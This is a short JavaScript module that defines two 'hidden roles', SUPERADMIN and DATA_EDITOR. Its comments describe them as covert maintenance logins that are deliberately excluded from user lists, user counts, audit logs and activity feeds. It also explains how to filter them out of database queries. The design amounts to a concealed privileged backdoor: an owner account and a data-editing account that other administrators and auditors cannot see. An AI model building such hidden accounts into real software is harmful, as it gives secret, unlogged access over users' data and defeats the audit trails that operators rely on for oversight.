// Roles that must never surface to ordinary users. These are covert maintenance
// logins: they are excluded from user lists, @mention recipient pickers, user
// counts, audit logs and activity feeds. The only way to reach such an account
// is to log into it directly.
//
//   SUPERADMIN  — hidden owner hatch (only a SUPERADMIN session sees a SUPERADMIN)
//   DATA_EDITOR — hidden edit-only data corrector (nobody sees it but itself)
//
// Use `{ role: { notIn: HIDDEN_ROLES } }` in Prisma `where` clauses to filter
// them out for everyone else.
const HIDDEN_ROLES = ['SUPERADMIN', 'DATA_EDITOR'];

module.exports = { HIDDEN_ROLES };
